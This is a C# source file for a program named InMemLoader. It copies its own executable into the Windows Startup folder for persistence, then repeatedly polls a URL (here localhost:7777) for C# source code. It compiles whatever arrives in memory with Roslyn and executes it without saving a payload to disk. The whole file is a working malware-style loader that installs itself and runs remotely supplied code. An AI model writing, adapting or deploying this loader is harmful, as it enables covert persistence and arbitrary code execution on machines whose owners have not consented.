using System;
using System.Net.Http;
using System.Threading.Tasks;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using System.Reflection;
using System.IO;
using System.Linq;

public class InMemLoader
{

    public static async Task Main(string[] args)
    {
        try
        {
            string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string targetPath = Path.Combine(startupDir, Path.GetFileName(exePath));

            if (!File.Exists(targetPath))
            {
                File.Copy(exePath, targetPath);
                Console.WriteLine($"Copied to startup: {targetPath}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to copy to startup folder: {ex.Message}");
        }

        string codeUrl = "http://localhost:7777/code";
        using var http = new HttpClient();

        string code = null;

        // Retry forever on connection failure
        while (code == null)
        {
            try
            {
                code = await http.GetStringAsync(codeUrl);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Connection failed: {ex.Message}. Retrying...");
                await Task.Delay(3000);  // Wait for 3 seconds before retrying
            }
        }

        var syntaxTree = CSharpSyntaxTree.ParseText(code);

        var references = AppDomain.CurrentDomain.GetAssemblies()
            .Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location))
            .Select(a => MetadataReference.CreateFromFile(a.Location))
            .ToList();

        var netDir = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory();

        // Add missing assemblies for Process + Component
        references.Add(MetadataReference.CreateFromFile(Path.Combine(netDir, "System.Diagnostics.Process.dll")));
        references.Add(MetadataReference.CreateFromFile(Path.Combine(netDir, "System.ComponentModel.Primitives.dll")));

        var compilation = CSharpCompilation.Create("DynamicAssembly")
            .WithOptions(new CSharpCompilationOptions(OutputKind.ConsoleApplication))
            .AddReferences(references)
            .AddSyntaxTrees(syntaxTree);

        using var ms = new MemoryStream();
        var result = compilation.Emit(ms);

        if (!result.Success)
        {
            Console.WriteLine("Compilation failed:");
            foreach (var diagnostic in result.Diagnostics)
                Console.WriteLine(diagnostic.ToString());
            return;
        }

        ms.Seek(0, SeekOrigin.Begin);
        var assembly = Assembly.Load(ms.ToArray());

        var entry = assembly.EntryPoint ?? assembly.GetTypes().First().GetMethods().First();
        entry.Invoke(null, entry.GetParameters().Length == 0 ? null : new object[] { new string[0] });
    }
}